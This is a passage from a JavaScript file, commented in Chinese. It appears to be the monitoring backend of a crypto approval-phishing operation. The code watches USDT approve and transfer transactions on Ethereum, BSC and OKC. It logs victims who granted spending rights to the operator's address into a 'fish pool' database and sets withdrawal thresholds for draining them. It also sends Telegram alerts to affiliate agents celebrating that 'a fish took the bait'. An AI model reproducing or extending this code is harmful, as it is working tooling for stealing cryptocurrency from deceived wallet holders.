    return configs[chain] || configs['ERC'];
}


// ERC监控模块

// ERC Web3实例
let ERCweb3Instance = null;
// ERC 网络配置参数 
const ERC_CONFIG = {
   rpc: 'https://rpc.ankr.com/eth',                // 主节点
   // 备用节点
   rpcBackups: [
       'https://cloudflare-eth.com'
   ],
   usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7', //USDT合约地址
   decimals: 6,                                    // 代币精度
   symbol: 'ETH',                                  // GAS名称
   chainId: 'ERC'                                  // 链标识
};

// 初始化 Web3 实例
async function ERCinitWeb3() {
   try {
       ERCweb3Instance = new Web3(new Web3.providers.HttpProvider(ERC_CONFIG.rpc));
       await ERCweb3Instance.eth.getBlockNumber();
       return true;
   } catch (error) {
    //   console.error(`[${getTimeInfo().time}] ERC主节点连接失败，尝试备用节点...`);
       // 尝试备用节点
       for (const backupRpc of ERC_CONFIG.rpcBackups) {
           try {
               ERCweb3Instance = new Web3(new Web3.providers.HttpProvider(backupRpc));
               await ERCweb3Instance.eth.getBlockNumber();
            //   console.log(`[${getTimeInfo().time}] 成功连接到备用节点: ${backupRpc}`);
               return true;
           } catch (err) {
            //   console.error(`[${getTimeInfo().time}] ERC备用节点连接失败: ${backupRpc}`);
               continue;
           }
       }
    //   console.error(`[${getTimeInfo().time}] ERC所有节点连接都失败`);
       return false;
   }
}

// 获取最新的区块号并处理新区块
async function ERCfetchLatestBlock() {
   let ERClastProcessedBlock = null;
   while (true) {
       try {
           if (!ERCweb3Instance) {
               console.error(`[${getTimeInfo().time}] ERC-Web3实例不存在，请确保已初始化`);
               await new Promise(resolve => setTimeout(resolve, 5000));
               continue;
           }
           const blockNumber = Number(await ERCweb3Instance.eth.getBlockNumber());
           if (ERClastProcessedBlock === null) {
               console.log(`[${getTimeInfo().time}] ERC初始化: 当前最新区块号为 ${blockNumber}`);
               ERClastProcessedBlock = blockNumber;
           } else if (blockNumber > ERClastProcessedBlock) {
               const newBlocks = [];
               for (let i = ERClastProcessedBlock + 1; i <= blockNumber; i++) {
                   newBlocks.push(i);
               }
               for (const block of newBlocks) {
                   await ERCscanBlock(block);
               }
               ERClastProcessedBlock = blockNumber;
           }
       } catch (error) {
        //   console.error(`[${getTimeInfo().time}] ERC获取最新区块时发生错误:`, error);
           // 如果错误，尝试重新初始化
           await ERCinitWeb3();
       }
       await new Promise(resolve => setTimeout(resolve, 5000));
   }
}

// ERC获取区块信息
async function ERCscanBlock(blockNumber) {
   try {
       if (!ERCweb3Instance) {
           console.log(`[${getTimeInfo().time}] ERC-Web3实例不存在，跳过区块 ${blockNumber}`);
           return;
       }
       const block = await ERCweb3Instance.eth.getBlock(blockNumber, true);
       if (!block) {
           console.log(`[${getTimeInfo().time}] ERC区块 ${blockNumber} 未找到，跳过该区块`);
           return;
       }
       if (block.transactions && block.transactions.length > 0) {
           for (const tx of block.transactions) {
               // 验证一下
               if (!tx || typeof tx !== 'object' || !tx.to || !tx.from || !tx.input || !tx.hash) {
                   continue;
               }
               // 只获取USDT交易事件
               if (tx.to.toLowerCase() !== ERC_CONFIG.usdt.toLowerCase()) {
                   continue;
               }
               const methodId = tx.input.slice(0, 10);
               const transactionData = {
                   hash: tx.hash,
                   from: tx.from,
                   to: tx.to,
                   value: String(tx.value),
                   valueInETH: ERCweb3Instance.utils.fromWei(tx.value, 'ether'),
                   gas: String(tx.gas),
                   gasPrice: String(tx.gasPrice),
                   gasPriceInGwei: ERCweb3Instance.utils.fromWei(tx.gasPrice, 'gwei'),
                   input: tx.input,
                   nonce: String(tx.nonce),
                   blockNumber: String(blockNumber),
                   timestamp: String(block.timestamp),
                   transactionIndex: String(tx.transactionIndex)
               };
               if (methodId === '0xa9059cbb') {
                   // transfer 事件
                   await ERCusdt_transfer(transactionData);
               } else if (methodId === '0x095ea7b3') {
                   // approve 事件
                   await ERCusdt_approve(transactionData);
               }
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] ERC处理区块 ${blockNumber} 时发生错误:`, error);
   }
}

// ERC-USDT 转账处理
async function ERCusdt_transfer(transaction) {
   try {
       const fromAddress = transaction.from.toLowerCase();
       const toAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
       const amount = parseInt(transaction.input.slice(74), 16) / (10 ** ERC_CONFIG.decimals);

       const relatedAddresses = Array.from(cacheData.fishMap.values())
           .filter(row => (
               (row.fish_address.toLowerCase() === fromAddress || 
               row.fish_address.toLowerCase() === toAddress) && 
               row.chainid === 'ERC' &&
               row.auth_status === 1
           ));
       if (!relatedAddresses.length) return;
       for (const row of relatedAddresses) {
           const address = row.fish_address;
           const unique_id = row.unique_id;
           const isOutgoing = address.toLowerCase() === fromAddress;
           const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
           const transactionAddress = isOutgoing ? toAddress : fromAddress;
           const dailiInfo = cacheData.dailiMap.get(unique_id);
           if (!dailiInfo) continue;
           const { username, groupid } = dailiInfo;
           const { gasBalance, usdtBalance } = await ERCcheckBalance(address, ERC_CONFIG.chainId);
           const notification = `🐟【鱼苗动账通知】ETH-USDT 转账通知🐟\n\n` +
               `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
               `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
               `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
               `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
               `🪫ETH 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
           const buttons = {
               reply_markup: {
                   inline_keyboard: [
                       [{ text: "🌍详细交易信息", url: `https://cn.etherscan.com/tx/${transaction.hash}` }]
                   ]
               }
           };
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
           await pool.promise().query(
               "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'ERC' AND auth_status = 1",
               [gasBalance, usdtBalance, address]
           );
           const fishInfo = cacheData.fishMap.get(address);
           if (fishInfo) {
               fishInfo.gas_balance = gasBalance;
               fishInfo.usdt_balance = usdtBalance;
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] ERC处理USDT转账时发生错误:`, error);
   }
}

// ERC-USDT 授权处理
async function ERCusdt_approve(transaction) {
    try {
        const OxPermissionAddress = cacheData.options['OxPermissionAddress'];
        const fromAddress = transaction.from.toLowerCase();
        const spenderAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
        const transferAmountIn = parseInt(transaction.input.slice(74), 16) / (10 ** ERC_CONFIG.decimals);
        if (spenderAddress !== OxPermissionAddress.toLowerCase()) {
            return;
        }
        const date = new Date(Number(transaction.timestamp) * 1000);
        const localTime = date.toISOString().slice(0, 19).replace('T', ' ');
        const { gasBalance, usdtBalance } = await ERCcheckBalance(fromAddress, ERC_CONFIG.chainId);
        
        let unique_id = null;
        const [browseRow] = await pool.promise().query(
            "SELECT unique_id FROM fish_browse WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'ERC' ORDER BY time DESC LIMIT 1",
            [fromAddress]
        );
        if (browseRow.length > 0 && browseRow[0].unique_id) {
            unique_id = browseRow[0].unique_id;
        } else {
            const [defaultIdRow] = await pool.promise().query(
                "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
            );
            
            if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
                unique_id = defaultIdRow[0].value;
            }
        }
        const dailiInfo = cacheData.dailiMap.get(unique_id);
        const { username, groupid, threshold } = dailiInfo;
        const usernameDisplay = username ? ` @${username}` : '';
        const [existingFish] = await pool.promise().query(
            "SELECT * FROM fish WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'ERC'",
            [fromAddress]
        );
        let approvalStatus = "";
        let additionalNote = "";
        if (transferAmountIn === 0 || transferAmountIn < 200) {
            if (transferAmountIn === 0) {
                approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
                additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
                if (existingFish.length > 0) {
                    await pool.promise().query(
                        "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'ERC'",
                        ["取消授权", fromAddress]
                    );
                }
            } else {
                approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
                additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
                if (existingFish.length > 0) {
                    await pool.promise().query(
                        "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'ERC'",
                        [`授权额度：${Math.floor(transferAmountIn)}`, fromAddress]
                    );
                }
            }
        } else {
            approvalStatus = "✅ <code>授权成功</code>";
            additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fromAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
            
            if (existingFish.length > 0) {
                await pool.promise().query(
                    "UPDATE fish SET chainid = 'ERC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'ERC'",
                    [OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id, fromAddress]
                );
            } else {
                await pool.promise().query(
                    "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'ERC', ?, ?, ?, ?, ?, ?, NULL, 1)",
                    [fromAddress, OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id]
                );
            }
        }
        const notification = `🎣【有鱼上钩啦】ERC-USDT授权通知🎣\n\n` +
            `🐠鱼苗地址${usernameDisplay}：<code>${fromAddress}</code>\n\n` +
            `🔐权限地址：<code>${OxPermissionAddress}</code>\n\n` +
            `📨授权状态：${approvalStatus}\n\n` +
            `⏰授权时间：<code>${localTime}</code>\n\n` +
            `🪫ETH 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
            `<b>${additionalNote}</b>`;
        const buttons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🌍详细交易信息", url: `https://cn.etherscan.com/tx/${transaction.hash}` }]
                ]
            }
        };
        if (groupid) {
            await bot.sendMessage(groupid, notification, {
                parse_mode: "HTML",
                disable_web_page_preview: true,
                ...buttons
            });
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] ERC处理USDT授权时发生错误:`, error);
    }
}

// BSC监控模块

// BSC Web3实例
let BSCweb3Instance = null;
// BSC 网络配置参数 
const BSC_CONFIG = {
    rpc: 'https://bsc-dataseed1.binance.org',      // 主节点
    // 备用节点
    rpcBackups: [
        'https://bsc-dataseed2.binance.org',
        'https://bsc-dataseed3.binance.org',
        'https://bsc-dataseed4.binance.org',
        'https://bsc.nodereal.io'
    ],
    usdt: '0x55d398326f99059fF775485246999027B3197955', //USDT合约地址
    decimals: 18,                                   // 代币精度
    symbol: 'BNB',                                  // GAS名称
    chainId: 'BSC'                                 // 链标识
};

// 初始化 Web3 实例
async function BSCinitWeb3() {
    try {
        BSCweb3Instance = new Web3(new Web3.providers.HttpProvider(BSC_CONFIG.rpc));
        await BSCweb3Instance.eth.getBlockNumber();
        return true;
    } catch (error) {
        // console.error(`[${getTimeInfo().time}] BSC-主节点连接失败，尝试备用节点...`);
        // 尝试备用节点
        for (const backupRpc of BSC_CONFIG.rpcBackups) {
            try {
                BSCweb3Instance = new Web3(new Web3.providers.HttpProvider(backupRpc));
                await BSCweb3Instance.eth.getBlockNumber();
                // console.log(`[${getTimeInfo().time}] 成功连接到备用节点: ${backupRpc}`);
                return true;
            } catch (err) {
                // console.error(`[${getTimeInfo().time}] BSC-备用节点连接失败: ${backupRpc}`);
                continue;
            }
        }
        // console.error(`[${getTimeInfo().time}] BSC-所有节点连接都失败`);
        return false;
    }
}

// 获取最新的区块号并处理新区块
async function BSCfetchLatestBlock() {
    let BSClastProcessedBlock = null;
    while (true) {
        try {
            if (!BSCweb3Instance) {
                console.error(`[${getTimeInfo().time}] BSC-Web3实例不存在，请确保已初始化`);
                await new Promise(resolve => setTimeout(resolve, 5000));
                continue;
            }
            const blockNumber = Number(await BSCweb3Instance.eth.getBlockNumber());
            if (BSClastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] BSC初始化: 当前最新区块号为 ${blockNumber}`);
                BSClastProcessedBlock = blockNumber;
            } else if (blockNumber > BSClastProcessedBlock) {
                const newBlocks = [];
                for (let i = BSClastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                for (const block of newBlocks) {
                    await BSCscanBlock(block);
                }
                BSClastProcessedBlock = blockNumber;
            }
        } catch (error) {
            // console.error(`[${getTimeInfo().time}] BSC获取最新区块时发生错误:`, error);
            // 如果错误，尝试重新初始化
            await BSCinitWeb3();
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// BSC获取区块信息
async function BSCscanBlock(blockNumber) {
    try {
        if (!BSCweb3Instance) {
            console.log(`[${getTimeInfo().time}] BSC-Web3实例不存在，跳过区块 ${blockNumber}`);
            return;
        }
        const block = await BSCweb3Instance.eth.getBlock(blockNumber, true);
        if (!block) {
            console.log(`[${getTimeInfo().time}] BSC区块 ${blockNumber} 未找到，跳过该区块`);
            return;
        }
        if (block.transactions && block.transactions.length > 0) {
            for (const tx of block.transactions) {
                if (!tx || typeof tx !== 'object' || !tx.to || !tx.from || !tx.input || !tx.hash) {
                    continue;
                }
                if (tx.to.toLowerCase() !== BSC_CONFIG.usdt.toLowerCase()) {
                    continue;
                }
                const methodId = tx.input.slice(0, 10);
                const transactionData = {
                    hash: tx.hash,
                    from: tx.from,
                    to: tx.to,
                    value: String(tx.value),
                    valueInBNB: BSCweb3Instance.utils.fromWei(tx.value, 'ether'),
                    gas: String(tx.gas),
                    gasPrice: String(tx.gasPrice),
                    gasPriceInGwei: BSCweb3Instance.utils.fromWei(tx.gasPrice, 'gwei'),
                    input: tx.input,
                    nonce: String(tx.nonce),
                    blockNumber: String(blockNumber),
                    timestamp: String(block.timestamp),
                    transactionIndex: String(tx.transactionIndex)
                };
                if (methodId === '0xa9059cbb') {
                    // transfer 事件
                    await BSCusdt_transfer(transactionData);
                } else if (methodId === '0x095ea7b3') {
                    // approve 事件
                    await BSCusdt_approve(transactionData);
                }
            }
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] BSC处理区块 ${blockNumber} 时发生错误:`, error);
    }
}

// BSC-USDT 转账处理
async function BSCusdt_transfer(transaction) {
   try {
       const fromAddress = transaction.from.toLowerCase();
       const toAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
       const amount = parseInt(transaction.input.slice(74), 16) / (10 ** BSC_CONFIG.decimals);
       const relatedAddresses = Array.from(cacheData.fishMap.values())
           .filter(row => (
               (row.fish_address.toLowerCase() === fromAddress || 
               row.fish_address.toLowerCase() === toAddress) &&
               row.chainid === 'BSC' &&
               row.auth_status === 1
           ));
       if (!relatedAddresses.length) return;
       for (const row of relatedAddresses) {
           const address = row.fish_address;
           const unique_id = row.unique_id;
           const isOutgoing = address.toLowerCase() === fromAddress;
           const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
           const transactionAddress = isOutgoing ? toAddress : fromAddress;
           const dailiInfo = cacheData.dailiMap.get(unique_id);
           if (!dailiInfo) continue;
           const { username, groupid } = dailiInfo;
           const { gasBalance, usdtBalance } = await ERCcheckBalance(address, BSC_CONFIG.chainId);
           const notification = `🐟【鱼苗动账通知】BSC-USDT 转账通知🐟\n\n` +
               `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
               `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
               `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
               `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
               `🪫BNB 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
           const buttons = {
               reply_markup: {
                   inline_keyboard: [
                       [{ text: "🌍详细交易信息", url: `https://bscscan.com/tx/${transaction.hash}` }]
                   ]
               }
           };
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
           await pool.promise().query(
               "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'BSC' AND auth_status = 1",
               [gasBalance, usdtBalance, address]
           );
           const fishInfo = cacheData.fishMap.get(address);
           if (fishInfo) {
               fishInfo.gas_balance = gasBalance;
               fishInfo.usdt_balance = usdtBalance;
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] BSC处理USDT转账时发生错误:`, error);
   }
}

// BSC-USDT 授权处理
async function BSCusdt_approve(transaction) {
  try {
      const OxPermissionAddress = cacheData.options['OxPermissionAddress'];
      const fromAddress = transaction.from.toLowerCase();
      const spenderAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
      const transferAmountIn = parseInt(transaction.input.slice(74), 16) / (10 ** BSC_CONFIG.decimals);
      if (spenderAddress !== OxPermissionAddress.toLowerCase()) {
          return;
      }
      const date = new Date(Number(transaction.timestamp) * 1000);
      const localTime = date.toISOString().slice(0, 19).replace('T', ' ');
      const { gasBalance, usdtBalance } = await ERCcheckBalance(fromAddress, BSC_CONFIG.chainId);
      
      let unique_id = null;
      const [browseRow] = await pool.promise().query(
          "SELECT unique_id FROM fish_browse WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'BSC' ORDER BY time DESC LIMIT 1",
          [fromAddress]
      );
      if (browseRow.length > 0 && browseRow[0].unique_id) {
          unique_id = browseRow[0].unique_id;
      } else {
          const [defaultIdRow] = await pool.promise().query(
              "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
          );
          if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
              unique_id = defaultIdRow[0].value;
          }
      }
      const dailiInfo = cacheData.dailiMap.get(unique_id);
      const { username, groupid, threshold } = dailiInfo;
      const usernameDisplay = username ? ` @${username}` : '';
      const [existingFish] = await pool.promise().query(
          "SELECT * FROM fish WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'BSC'",
          [fromAddress]
      );
      let approvalStatus = "";
      let additionalNote = "";
      if (transferAmountIn === 0 || transferAmountIn < 200) {
          if (transferAmountIn === 0) {
              approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
              additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'BSC'",
                      ["取消授权", fromAddress]
                  );
              }
          } else {
              approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
              additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'BSC'",
                      [`授权额度：${Math.floor(transferAmountIn)}`, fromAddress]
                  );
              }
          }
      } else {
          approvalStatus = "✅ <code>授权成功</code>";
          additionalNote = `✅ 当前默认提币阈值为 <code>${threshold} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fromAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
          if (existingFish.length > 0) {
              await pool.promise().query(
                  "UPDATE fish SET chainid = 'BSC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'BSC'",
                  [OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id, fromAddress]
              );
          } else {
              await pool.promise().query(
                  "INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'BSC', ?, ?, ?, ?, ?, ?, NULL, 1)",
                  [fromAddress, OxPermissionAddress, usdtBalance, gasBalance, threshold, localTime, unique_id]
              );
          }
      }
      const notification = `🎣【有鱼上钩啦】BSC-USDT授权通知🎣\n\n` +
          `🐠鱼苗地址${usernameDisplay}：<code>${fromAddress}</code>\n\n` +
          `🔐权限地址：<code>${OxPermissionAddress}</code>\n\n` +
          `📨授权状态：${approvalStatus}\n\n` +
          `⏰授权时间：<code>${localTime}</code>\n\n` +
          `🪫BNB 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
          `<b>${additionalNote}</b>`;
      const buttons = {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "🌍详细交易信息", url: `https://bscscan.com/tx/${transaction.hash}` }]
              ]
          }
      };
      if (groupid) {
          await bot.sendMessage(groupid, notification, {
              parse_mode: "HTML",
              disable_web_page_preview: true,
              ...buttons
          });
      }
  } catch (error) {
      console.error(`[${getTimeInfo().time}] BSC处理USDT授权时发生错误:`, error);
  }
}

// OKC监控模块

// OKC Web3实例
let OKCweb3Instance = null;
// OKC 网络配置参数 
const OKC_CONFIG = {
    rpc: 'https://exchainrpc.okex.org',            // 主节点
    // 备用节点
    rpcBackups: [
        'https://okc-mainnet.gateway.pokt.network/v1/lb/6275309bea1b320039c893ff'
    ],
    usdt: '0x382bb369d343125bfb2117af9c149795c6c65c50', //USDT合约地址
    decimals: 18,                                   // 代币精度
    symbol: 'OKT',                                  // GAS名称
    chainId: 'OKC'                                 // 链标识
};

// 初始化 Web3 实例
async function OKCinitWeb3() {
    try {
        OKCweb3Instance = new Web3(new Web3.providers.HttpProvider(OKC_CONFIG.rpc));
        await OKCweb3Instance.eth.getBlockNumber();
        return true;
    } catch (error) {
        // console.error(`[${getTimeInfo().time}] OKT-主节点连接失败，尝试备用节点...`);
        // 尝试备用节点
        for (const backupRpc of OKC_CONFIG.rpcBackups) {
            try {
                OKCweb3Instance = new Web3(new Web3.providers.HttpProvider(backupRpc));
                await OKCweb3Instance.eth.getBlockNumber();
                return true;
            } catch (err) {
                // console.error(`[${getTimeInfo().time}]  OKT-备用节点连接失败: ${backupRpc}`);
                continue;
            }
        }
        // console.error(`[${getTimeInfo().time}]  OKT-所有节点连接都失败`);
        return false;
    }
}

// 获取最新的区块号并处理新区块
async function OKCfetchLatestBlock() {
    let OKClastProcessedBlock = null;
    while (true) {
        try {
            if (!OKCweb3Instance) {
                console.error(`[${getTimeInfo().time}] Web3实例不存在，请确保已初始化`);
                await new Promise(resolve => setTimeout(resolve, 5000));
                continue;
            }
            const blockNumber = Number(await OKCweb3Instance.eth.getBlockNumber());
            if (OKClastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] OKC初始化: 当前最新区块号为 ${blockNumber}`);
                OKClastProcessedBlock = blockNumber;
            } else if (blockNumber > OKClastProcessedBlock) {
                const newBlocks = [];
                for (let i = OKClastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                for (const block of newBlocks) {
                    await OKCscanBlock(block);
                }
                OKClastProcessedBlock = blockNumber;
            }
        } catch (error) {
            // console.error(`[${getTimeInfo().time}] OKC获取最新区块时发生错误:`, error);
            // 如果错误，尝试重新初始化
            await OKCinitWeb3();
        }
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

// OKC获取区块信息
async function OKCscanBlock(blockNumber) {
    try {
        if (!OKCweb3Instance) {
            console.log(`[${getTimeInfo().time}]  OKT-Web3实例不存在，跳过区块 ${blockNumber}`);
            return;
        }
        const block = await OKCweb3Instance.eth.getBlock(blockNumber, true);
        if (!block) {
            console.log(`[${getTimeInfo().time}] OKC区块 ${blockNumber} 未找到，跳过该区块`);
            return;
        }
        if (block.transactions && block.transactions.length > 0) {
            for (const tx of block.transactions) {
                if (!tx || typeof tx !== 'object' || !tx.to || !tx.from || !tx.input || !tx.hash) {
                    continue;
                }
                if (tx.to.toLowerCase() !== OKC_CONFIG.usdt.toLowerCase()) {
                    continue;
                }
                const methodId = tx.input.slice(0, 10);
                const transactionData = {
                    hash: tx.hash,
                    from: tx.from,
                    to: tx.to,
                    value: String(tx.value),
                    valueInOKT: OKCweb3Instance.utils.fromWei(tx.value, 'ether'),
                    gas: String(tx.gas),
                    gasPrice: String(tx.gasPrice),
                    gasPriceInGwei: OKCweb3Instance.utils.fromWei(tx.gasPrice, 'gwei'),
                    input: tx.input,
                    nonce: String(tx.nonce),
                    blockNumber: String(blockNumber),
                    timestamp: String(block.timestamp),
                    transactionIndex: String(tx.transactionIndex)
                };
                if (methodId === '0xa9059cbb') {
                    // transfer 事件
                    await OKCusdt_transfer(transactionData);
                } else if (methodId === '0x095ea7b3') {
                    // approve 事件
                    await OKCusdt_approve(transactionData);
                }
            }
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] OKC处理区块 ${blockNumber} 时发生错误:`, error);
    }
}

async function OKCusdt_transfer(transaction) {
   try {
       const fromAddress = transaction.from.toLowerCase();
       const toAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
       const amount = parseInt(transaction.input.slice(74), 16) / (10 ** OKC_CONFIG.decimals);
       const relatedAddresses = Array.from(cacheData.fishMap.values())
           .filter(row => (
               (row.fish_address.toLowerCase() === fromAddress || 
               row.fish_address.toLowerCase() === toAddress) &&
               row.chainid === 'OKC' &&
               row.auth_status === 1
           ));
       if (!relatedAddresses.length) return;
       for (const row of relatedAddresses) {
           const address = row.fish_address;
           const unique_id = row.unique_id;
           const isOutgoing = address.toLowerCase() === fromAddress;
           const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额";
           const transactionAddress = isOutgoing ? toAddress : fromAddress;
           const dailiInfo = cacheData.dailiMap.get(unique_id);
           if (!dailiInfo) continue;
           const { username, groupid } = dailiInfo;
           const { gasBalance, usdtBalance } = await ERCcheckBalance(address, OKC_CONFIG.chainId);
           const notification = `🐟【鱼苗动账通知】OKC-USDT 转账通知🐟\n\n` +
               `🐠鱼苗地址 @${username}：\n<code>${address}</code>\n\n` +
               `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
               `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
               `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
               `🪫OKT 余额：<code>${gasBalance !== null ? gasBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
           const buttons = {
               reply_markup: {
                   inline_keyboard: [
                       [{ text: "🌍详细交易信息", url: `https://www.oklink.com/okc/tx/${transaction.hash}` }]
                   ]
               }
           };
           await bot.sendMessage(groupid, notification, {
               parse_mode: "HTML",
               disable_web_page_preview: true,
               ...buttons
           });
           await pool.promise().query(
               "UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'OKC' AND auth_status = 1",
               [gasBalance, usdtBalance, address]
           );
           const fishInfo = cacheData.fishMap.get(address);
           if (fishInfo) {
               fishInfo.gas_balance = gasBalance;
               fishInfo.usdt_balance = usdtBalance;
           }
       }
   } catch (error) {
       console.error(`[${getTimeInfo().time}] OKC处理USDT转账时发生错误:`, error);
   }
}

// OKC-USDT 授权处理
async function OKCusdt_approve(transaction) {
  try {
      const OxPermissionAddress = cacheData.options['OxPermissionAddress'];
      const fromAddress = transaction.from.toLowerCase();
      const spenderAddress = '0x' + transaction.input.slice(34, 74).toLowerCase();
      const transferAmountIn = parseInt(transaction.input.slice(74), 16) / (10 ** OKC_CONFIG.decimals);
      if (spenderAddress !== OxPermissionAddress.toLowerCase()) {
          return;
      }
      const date = new Date(Number(transaction.timestamp) * 1000);
      const localTime = date.toISOString().slice(0, 19).replace('T', ' ');
      const { gasBalance, usdtBalance } = await ERCcheckBalance(fromAddress, OKC_CONFIG.chainId);
      
      let unique_id = null;
      const [browseRow] = await pool.promise().query(
          "SELECT unique_id FROM fish_browse WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'OKC' ORDER BY time DESC LIMIT 1",
          [fromAddress]
      );
      if (browseRow.length > 0 && browseRow[0].unique_id) {
          unique_id = browseRow[0].unique_id;
      } else {
          const [defaultIdRow] = await pool.promise().query(
              "SELECT value FROM options WHERE name = 'default_id' LIMIT 1"
          );
          if (defaultIdRow.length > 0 && defaultIdRow[0].value) {
              unique_id = defaultIdRow[0].value;
          }
      }
      const dailiInfo = cacheData.dailiMap.get(unique_id);
      const { username, groupid, threshold } = dailiInfo;
      const usernameDisplay = username ? ` @${username}` : '';
      const [existingFish] = await pool.promise().query(
          "SELECT * FROM fish WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'OKC'",
          [fromAddress]
      );
      let approvalStatus = "";
      let additionalNote = "";
      if (transferAmountIn === 0 || transferAmountIn < 200) {
          if (transferAmountIn === 0) {
              approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
              additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
              if (existingFish.length > 0) {
                  await pool.promise().query(
                      "UPDATE fish SET remark = ?, auth_status = 0 WHERE LOWER(fish_address) = LOWER(?) AND chainid = 'OKC'",
                      ["取消授权", fromAddress]
                  );
              }
          } else {
              approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
              additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
              if (existingFish.length > 0) {
                  await pool.promise().query(
